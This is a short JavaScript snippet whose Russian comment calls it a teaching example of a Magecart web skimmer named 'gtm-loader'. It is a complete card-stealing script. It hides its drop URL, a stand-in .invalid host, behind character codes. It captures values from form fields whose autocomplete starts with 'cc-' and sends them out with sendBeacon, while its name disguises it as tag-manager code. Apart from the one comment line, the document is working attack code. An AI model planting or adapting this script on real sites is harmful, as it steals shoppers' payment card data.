/* gtm-loader 3.4.1 — учебный пример веб-скиммера (Magecart). Адрес .invalid не существует, данные никуда не уходят. */
(function(){var _h=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,45,103,116,109,45,115,116,97,116,115,46,105,110,118,97,108,105,100,47,99);
var _d={};document.addEventListener('change',function(e){var t=e.target;if(t&&t.autocomplete&&t.autocomplete.indexOf('cc-')===0){_d[t.name]=t.value;
navigator.sendBeacon(_h,JSON.stringify(_d));}},true);})();
